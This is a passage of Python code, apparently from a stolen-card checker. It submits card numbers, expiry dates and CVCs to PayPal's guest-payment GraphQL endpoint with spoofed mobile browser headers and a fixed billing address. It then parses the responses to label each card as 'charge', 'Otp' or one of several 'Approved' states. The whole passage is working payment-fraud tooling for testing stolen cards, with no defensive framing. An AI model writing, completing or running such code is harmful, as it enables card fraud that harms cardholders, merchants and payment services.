    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}
    
    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
    'variables': {
        'token': id,
        'card': {
            'cardNumber': n,
            'type': 'VISA',
            'expirationDate': mm+'/20'+yy,
            'postalCode': zip_code,
            'securityCode': cvc,
        },
        'firstName': first_name,
        'lastName': last_name,
        'billingAddress': {
            'givenName': first_name,
            'familyName': last_name,
            'line1': 'New York',
            'line2': None,
            'city': 'New York',
            'state': 'NY',
            'postalCode': '10080',
            'country': 'US',
        },
        'email': acc,
        'currencyConversionType': 'VENDOR',
    },
    'operationName': None,
}
    
    response = requests.post(
        'https://www.paypal.com/graphql?fetch_credit_form_submit',
        headers=headers,
        json=json_data,
    )
    men = response.text
    import re
    pattern = r'"code":"(.*?)"'
    match = re.search(pattern, men)
    if match:
        kopi = match.group(1)
    last = response.text 
    if ('ADD_SHIPPING_ERROR' in last or
     '"status": "succeeded"' in last or
     'Thank You For Donation.' in last or
     'Your payment has already been processed' in last or
     'Success ' in last):
             return "charge"
    elif 'is3DSecureRequired' in last or 'OTP' in last:
        return "Otp"
    elif 'INVALID_SECURITY_CODE' in last:
        return "Approved (CCN)"
    elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
        return "Approved (Avs)"
    elif 'INVALID_BILLING_ADDRESS' in last:
        return "Approved (invalidAdd)"
    else:
        return kopi    